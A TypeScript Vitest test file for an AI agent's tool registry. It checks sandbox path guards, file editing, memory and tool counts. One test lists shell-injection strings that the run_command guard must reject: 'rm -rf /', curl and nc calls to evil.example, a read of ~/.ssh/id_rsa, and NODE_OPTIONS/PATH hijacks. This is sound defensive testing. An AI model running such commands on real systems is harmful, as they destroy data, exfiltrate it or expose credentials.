import fs from 'node:fs'
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import { loadConfig } from '../src/config.js'
import { ArtifactStore } from '../src/store/artifacts.js'
import { openDatabase } from '../src/store/db.js'
import { MemoryStore } from '../src/store/memory.js'
import { SkillLibrary } from '../src/store/skills.js'
import { TaskStore } from '../src/store/tasks.js'
import { createToolRegistry } from '../src/tools/builtin.js'
import type { ToolRuntime, TodoItem } from '../src/tools/registry.js'
import { makeTmpDir } from './helpers.js'

function makeRuntime(): {
  registry: ReturnType<typeof createToolRegistry>
  runtime: ToolRuntime
  todos: TodoItem[]
  artifacts: ArtifactStore
  memory: MemoryStore
  tasks: TaskStore
  sessionId: string
} {
  const cfg = loadConfig()
  const artifacts = new ArtifactStore(makeTmpDir('ma-art-'))
  const sessionId = 's1'
  const workspace = artifacts.ensureSessionDir(sessionId)
  const skills = new SkillLibrary(cfg.skillsDir)
  const db = openDatabase(path.join(makeTmpDir('ma-db-'), 'app.db'))
  // memory / summaries 等表的外键依赖会话行（M2）
  const now = new Date().toISOString()
  db.run(
    `INSERT INTO sessions (id, title, participant_ids, created_at, updated_at) VALUES (?, ?, ?, ?, ?)`,
    sessionId,
    '测试会话',
    JSON.stringify(['pm']),
    now,
    now,
  )
  const memory = new MemoryStore(db)
  const tasks = new TaskStore(db)
  const todos: TodoItem[] = []
  const runtime: ToolRuntime = {
    sessionId,
    runId: 'r1',
    agentId: 'pm',
    workspace,
    artifacts,
    skills,
    memory,
    tasks,
    participants: [
      { id: 'pm', name: '费利' },
      { id: 'architect', name: '阿奇' },
    ],
    todos,
    allowRunCommand: false,
    allowedCommands: [],
    allowSensitive: false,
    webSearch: { apiKey: '', apiUrl: '', htmlUrl: '' },
    httpUserAgent: '',
    httpMinIntervalMs: 0,
    httpTimeoutMs: 15_000,
    loadSkill: (name) => {
      const skill = skills.get(name)
      return skill ? { ok: true, body: skill.body } : { ok: false, error: `技能「${name}」不存在` }
    },
  }
  return { registry: createToolRegistry(cfg), runtime, todos, artifacts, memory, tasks, sessionId }
}

describe('tools：沙箱守卫', () => {
  it('write_file 越界（../）→ 拒绝', async () => {
    const { registry, runtime } = makeRuntime()
    const result = await registry.execute('write_file', { path: '../evil.md', content: 'x' }, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('路径越界')
  })

  it('write_file 深层越界（a/../../x）→ 拒绝', async () => {
    const { registry, runtime } = makeRuntime()
    const result = await registry.execute('write_file', { path: 'docs/../../../x.md', content: 'x' }, runtime)
    expect(result.ok).toBe(false)
  })

  it('read_file 绝对路径逃逸 → 拒绝', async () => {
    const { registry, runtime } = makeRuntime()
    const result = await registry.execute('read_file', { path: '/etc/hosts' }, runtime)
    expect(result.ok).toBe(false)
  })

  it('list_dir ../.. → 拒绝', async () => {
    const { registry, runtime } = makeRuntime()
    const result = await registry.execute('list_dir', { path: '../..' }, runtime)
    expect(result.ok).toBe(false)
  })
})

describe('tools：文件工具', () => {
  it('write_file 落盘 + 返回 artifacts + 作者标记', async () => {
    const { registry, runtime, artifacts, sessionId } = makeRuntime()
    const result = await registry.execute(
      'write_file',
      { path: 'docs/方案.md', content: '# 方案\n内容' },
      runtime,
    )
    expect(result.ok).toBe(true)
    expect(result.artifacts).toEqual(['docs/方案.md'])
    const list = artifacts.list(sessionId)
    expect(list[0].path).toBe('docs/方案.md')
    expect(list[0].authorAgentId).toBe('pm')
    expect(list[0].kind).toBe('markdown')
  })

  it('write_file append：分节追加（空行衔接）与新建等价；md 落盘回灌体检', async () => {
    const { registry, runtime } = makeRuntime()
    const first = await registry.execute(
      'write_file',
      { path: 'docs/报告.md', content: '# 报告\n\n<!-- §1 待填 -->' },
      runtime,
    )
    expect(first.ok).toBe(true)
    expect(first.detail).toContain('体检：')
    // 占位残留提示（真实模型探针实测：交付前清理）
    expect(first.detail).toContain('占位残留')

    const second = await registry.execute(
      'write_file',
      { path: 'docs/报告.md', content: '## 结论\n\n- 要点一', mode: 'append' },
      runtime,
    )
    expect(second.ok).toBe(true)
    expect(second.summary).toContain('已追加到')
    const read = await registry.execute('read_file', { path: 'docs/报告.md' }, runtime)
    expect(read.detail).toContain('# 报告')
    expect(read.detail).toContain('## 结论')
    expect(read.detail).toMatch(/# 报告[\s\S]*## 结论/)

    // append 到不存在文件 = 等价新建
    const created = await registry.execute(
      'write_file',
      { path: 'docs/新.md', content: '# 新文档', mode: 'append' },
      runtime,
    )
    expect(created.ok).toBe(true)
    expect(created.summary).toContain('已写入')
  })

  it('read_file 读回内容；不存在 → 失败', async () => {
    const { registry, runtime } = makeRuntime()
    await registry.execute('write_file', { path: 'a.txt', content: '你好' }, runtime)
    const ok = await registry.execute('read_file', { path: 'a.txt' }, runtime)
    expect(ok.ok).toBe(true)
    expect(ok.detail).toBe('你好')
    const missing = await registry.execute('read_file', { path: 'nope.txt' }, runtime)
    expect(missing.ok).toBe(false)
  })

  it('edit_file 未命中 → 失败并提示先 read_file', async () => {
    const { registry, runtime } = makeRuntime()
    await registry.execute('write_file', { path: 'a.md', content: 'hello world' }, runtime)
    const miss = await registry.execute(
      'edit_file',
      { path: 'a.md', old_text: '不存在', new_text: 'x' },
      runtime,
    )
    expect(miss.ok).toBe(false)
    expect(miss.summary).toContain('未命中')
  })

  it('edit_file 多处匹配且未 replace_all → 失败', async () => {
    const { registry, runtime } = makeRuntime()
    await registry.execute('write_file', { path: 'a.md', content: 'aa\naa' }, runtime)
    const result = await registry.execute(
      'edit_file',
      { path: 'a.md', old_text: 'aa', new_text: 'b' },
      runtime,
    )
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('2 次')
    const all = await registry.execute(
      'edit_file',
      { path: 'a.md', old_text: 'aa', new_text: 'b', replace_all: true },
      runtime,
    )
    expect(all.ok).toBe(true)
  })

  it('search_text 命中并返回 文件:行号', async () => {
    const { registry, runtime } = makeRuntime()
    await registry.execute('write_file', { path: 'docs/x.md', content: '第一行\n关键内容在这里' }, runtime)
    const result = await registry.execute('search_text', { pattern: '关键内容' }, runtime)
    expect(result.ok).toBe(true)
    expect(result.detail).toContain('docs/x.md:2')
  })
})

describe('tools：参数校验与护栏', () => {
  it('write_file 缺 content → 校验失败', async () => {
    const { registry, runtime } = makeRuntime()
    const result = await registry.execute('write_file', { path: 'a.md' }, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('参数校验失败')
  })

  it('未知工具 → 明确报错', async () => {
    const { registry, runtime } = makeRuntime()
    const result = await registry.execute('ghost_tool', {}, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('未知工具')
  })

  it('write_todos 更新运行时清单', async () => {
    const { registry, runtime, todos } = makeRuntime()
    const result = await registry.execute(
      'write_todos',
      {
        todos: [
          { content: '第一步', status: 'done' },
          { content: '第二步', status: 'in_progress' },
        ],
      },
      runtime,
    )
    expect(result.ok).toBe(true)
    expect(todos.length).toBe(2)
    expect(result.detail).toContain('☑ 第一步')
  })

  it('load_skill：已注册技能返回正文；未知技能报错', async () => {
    const { registry, runtime } = makeRuntime()
    const ok = await registry.execute('load_skill', { name: 'code-review' }, runtime)
    expect(ok.ok).toBe(true)
    expect(ok.detail).toContain('评审')
    const bad = await registry.execute('load_skill', { name: 'ghost' }, runtime)
    expect(bad.ok).toBe(false)
  })

  it('run_command 默认关闭 → 拒绝', async () => {
    const { registry, runtime } = makeRuntime()
    const result = await registry.execute('run_command', { command: 'npm test' }, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('禁用')
  })

  it('run_command 开启但不在白名单 → 拒绝', async () => {
    const { registry, runtime } = makeRuntime()
    runtime.allowRunCommand = true
    const result = await registry.execute('run_command', { command: 'rm -rf /' }, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('白名单')
  })

  it('工具超时护栏：慢工具 → 超时摘要', async () => {
    const cfg = loadConfig()
    const { ToolRegistry } = await import('../src/tools/registry.js')
    const registry = new ToolRegistry(30)
    const { z } = await import('zod')
    registry.register({
      name: 'slow',
      description: '慢工具',
      parameters: { type: 'object' },
      schema: z.object({}),
      execute: async () => {
        await new Promise((r) => setTimeout(r, 200))
        return { ok: true, summary: 'done' }
      },
    })
    const { runtime } = makeRuntime()
    const result = await registry.execute('slow', {}, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('超时')
    void cfg
  })
})

describe('tools：角色白名单过滤', () => {
  it('forAgent：按 front-matter tools 过滤', () => {
    const cfg = loadConfig()
    const registry = createToolRegistry(cfg)
    const subset = registry.forAgent({ tools: ['read_file', 'write_file'] })
    expect(subset.map((t) => t.name).sort()).toEqual(['read_file', 'write_file'])
    const all = registry.forAgent({})
    // 15（内置，含 web_search）+ 6（M6 git 工具集）+ 1（M7 request_approval）+ 4（M21.2 业务工具：calc/date_calc/csv_analyze/template_fill）
    // + 17（M22 连接中心：4 数据库 + 13 浏览器）+ 1（M23 ssh_exec）+ 3（M24 范式工具：write_plan/update_plan_step/submit_review）
    // + 1（M28 按需发现元工具：tool_search）
    // + 4（M31 画布创作：canvas_read/canvas_write/media_generate/media_video）
    // + 3（M35 定时任务：schedule_task/list_schedules/manage_schedule）
    // + 4（M51-E 命理排盘：bazi_pan/ziwei_pan/natal_pan/gua_pan）
    // + 2（M63-B 行运/合盘：transit_pan/synastry_pan）
    // + 1（M63-C 大六壬：daliuren_pan）
    // + 1（M63-D 奇门遁甲：qimen_pan）
    // + 1（M63-E 七政四余：qizheng_pan）
    // + 2（M69 场景玩法并发批：dice_roll/tarot_draw）
    // + 1（M66-A 罗盘排盘：luopan_pan）
    // + 1（M66 续完善择日：zeri_pan）
    // M48：invite_members 随调度官角色撤销（召集上收平台路由步），总数 56 → 55
    expect(all.length).toBe(68)
  })

  it('M28 tier：核心常驻 21 个（含 tool_search / 范式三件套）；重型连接与创作工具 47 个延迟', () => {
    const cfg = loadConfig()
    const registry = createToolRegistry(cfg)
    const all = registry.forAgent({})
    const deferred = all.filter((t) => t.tier === 'deferred').map((t) => t.name)
    const core = all.filter((t) => t.tier !== 'deferred').map((t) => t.name)
    expect(core).toHaveLength(21)
    expect(deferred).toHaveLength(47)
    expect(core).toContain('tool_search')
    expect(core).toContain('write_plan')
    expect(core).toContain('update_plan_step')
    expect(core).toContain('submit_review')
    // 延迟清单：管网 3（web_fetch / web_search / run_command）+ git 6 + db 4 + browser 13 + ssh 1 + M31 画布创作 4
    expect(deferred.filter((n) => n.startsWith('git_'))).toHaveLength(6)
    expect(deferred.filter((n) => n.startsWith('db_'))).toHaveLength(4)
    expect(deferred.filter((n) => n.startsWith('browser_'))).toHaveLength(13)
    expect(deferred.filter((n) => n.startsWith('ssh_'))).toHaveLength(1)
    expect(deferred).toContain('web_fetch')
    expect(deferred).toContain('web_search')
    expect(deferred).toContain('run_command')
    // M31：画布创作四件套（经 tool_search 激活）
    expect(deferred).toEqual(expect.arrayContaining(['canvas_read', 'canvas_write', 'media_generate', 'media_video']))
    // M35：定时任务三件套（经 tool_search 激活）
    expect(deferred).toEqual(expect.arrayContaining(['schedule_task', 'list_schedules', 'manage_schedule']))
    // M51-E：命理排盘四件套（纯计算只读，经 tool_search「排盘 / 命盘 / 星盘」激活）
    expect(deferred).toEqual(expect.arrayContaining(['bazi_pan', 'ziwei_pan', 'natal_pan', 'gua_pan']))
  })
})

describe('tools：M2 新增能力', () => {
  it('remember：写入会话记忆，重复内容幂等去重', async () => {
    const { registry, runtime, memory, sessionId } = makeRuntime()
    const first = await registry.execute(
      'remember',
      { kind: 'constraint', content: '错误码必须复用现有 40001 规范' },
      runtime,
    )
    expect(first.ok).toBe(true)
    expect(first.summary).toContain('已写入记忆')
    expect(memory.count(sessionId)).toBe(1)

    const second = await registry.execute(
      'remember',
      { kind: 'constraint', content: '错误码必须复用现有 40001 规范' },
      runtime,
    )
    expect(second.ok).toBe(true)
    expect(second.summary).toContain('已存在')
    expect(memory.count(sessionId)).toBe(1)
  })

  it('remember：非法 kind → 参数校验失败', async () => {
    const { registry, runtime } = makeRuntime()
    const result = await registry.execute('remember', { kind: 'unknown', content: 'x' }, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('参数校验失败')
  })

  it('read_file：offset/limit 分页 + 续读提示', async () => {
    const { registry, runtime } = makeRuntime()
    const lines = Array.from({ length: 30 }, (_, i) => `第 ${i + 1} 行内容`).join('\n')
    await registry.execute('write_file', { path: 'big.txt', content: lines }, runtime)

    const first = await registry.execute('read_file', { path: 'big.txt', offset: 1, limit: 10 }, runtime)
    expect(first.ok).toBe(true)
    expect(first.summary).toContain('第 1-10 行 / 共 30 行')
    expect(first.detail).toContain('offset=11')

    const tail = await registry.execute('read_file', { path: 'big.txt', offset: 25, limit: 10 }, runtime)
    expect(tail.ok).toBe(true)
    expect(tail.summary).toContain('第 25-30 行')
    expect(tail.detail).not.toContain('继续读取')
  })

  it('read_file：offset 超界 → 精确报错', async () => {
    const { registry, runtime } = makeRuntime()
    await registry.execute('write_file', { path: 'small.txt', content: 'a\nb' }, runtime)
    const result = await registry.execute('read_file', { path: 'small.txt', offset: 10 }, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('超出文件行数')
  })
})

describe('artifacts：扫描与读取', () => {
  it('嵌套目录扫描 + 隐藏文件忽略', async () => {
    const { registry, runtime, artifacts, sessionId } = makeRuntime()
    await registry.execute('write_file', { path: 'docs/a.md', content: '# a' }, runtime)
    await registry.execute('write_file', { path: 'web/src/b.ts', content: 'export {}' }, runtime)
    fs.writeFileSync(path.join(runtime.workspace, '.secret'), 'hidden')
    const list = artifacts.list(sessionId)
    const paths = list.map((f) => f.path).sort()
    expect(paths).toEqual(['docs/a.md', 'web/src/b.ts'])
    const code = list.find((f) => f.path === 'web/src/b.ts')
    expect(code?.kind).toBe('code')
  })

  it('read：文本内联 / 二进制标记', async () => {
    const { registry, runtime, artifacts, sessionId } = makeRuntime()
    await registry.execute('write_file', { path: 'a.md', content: '内容' }, runtime)
    const text = artifacts.read(sessionId, 'a.md', 1024)
    expect(text.content).toBe('内容')
    expect(text.binary).toBe(false)

    fs.writeFileSync(path.join(runtime.workspace, 'pic.png'), Buffer.from([0x89, 0x50]))
    const bin = artifacts.read(sessionId, 'pic.png', 1024)
    expect(bin.binary).toBe(true)
    expect(bin.content).toBeUndefined()
  })
})

describe('tools：审核加固（H-1 / M-5 / M-6）', () => {
  it('run_command 注入防护：shell 元字符 / 环境变量前缀 → 拒绝（H-1）', async () => {
    const { registry, runtime } = makeRuntime()
    const rt = { ...runtime, allowRunCommand: true, allowedCommands: ['npm test', 'echo ', 'git log'] }
    const injections = [
      'npm test; rm -rf /',
      'npm test && curl http://evil.example',
      'npm test || true',
      'npm test | nc evil.example 1234',
      'npm test $(curl evil.example)',
      'npm test `curl evil.example`',
      'npm test > /tmp/exfil',
      'npm test < /etc/hosts',
      'npm test\nrm -rf /',
      'npm test *',
      'echo ~/.ssh/id_rsa',
      'NODE_OPTIONS=--require=/tmp/evil.js npm test',
      'PATH=/tmp/evil npm test',
    ]
    for (const command of injections) {
      const result = await registry.execute('run_command', { command }, rt)
      expect(result.ok, `${command} 应被拒绝`).toBe(false)
    }
    // 白名单内且无元字符 → 正常执行
    const ok = await registry.execute('run_command', { command: 'echo injection-guard-ok' }, rt)
    expect(ok.ok).toBe(true)
    expect(ok.detail).toContain('injection-guard-ok')
  })

  it('read_file：超大文本文件 stat 预检 → 拒绝（M-5）', async () => {
    const { registry, runtime } = makeRuntime()
    // 用文本扩展名：M33 起二进制类型（.bin 等）由类型提示拦截、不读文件，
    // M-5 体积预检的保护对象是真正整块读入的文本路径
    const big = path.join(runtime.workspace, 'huge.txt')
    // 稀疏文件：仅设置逻辑大小，避免测试真实写入 9MB 数据
    fs.writeFileSync(big, '')
    fs.truncateSync(big, 9 * 1024 * 1024)
    const result = await registry.execute('read_file', { path: 'huge.txt' }, runtime)
    expect(result.ok).toBe(false)
    expect(result.summary).toContain('文件过大')
  })

  it('readCache：容量上限 FIFO 淘汰（M-6）', async () => {
    const { registry, runtime } = makeRuntime()
    fs.writeFileSync(path.join(runtime.workspace, 'cache-cap.txt'), 'l1\nl2\nl3\nl4\nl5')
    // 同一文件 501 个不同分页参数 → 501 个缓存键，触发 500 上限淘汰最早键
    const arg = (i: number): { path: string; offset: number; limit: number } => ({
      path: 'cache-cap.txt',
      offset: (i % 5) + 1,
      limit: Math.floor(i / 5) + 1,
    })
    for (let i = 0; i < 501; i++) {
      const r = await registry.execute('read_file', arg(i), runtime)
      expect(r.ok).toBe(true)
    }
    const evicted = await registry.execute('read_file', arg(0), runtime)
    expect(evicted.summary).not.toContain('缓存命中')
    const retained = await registry.execute('read_file', arg(500), runtime)
    expect(retained.summary).toContain('缓存命中')
  })
})
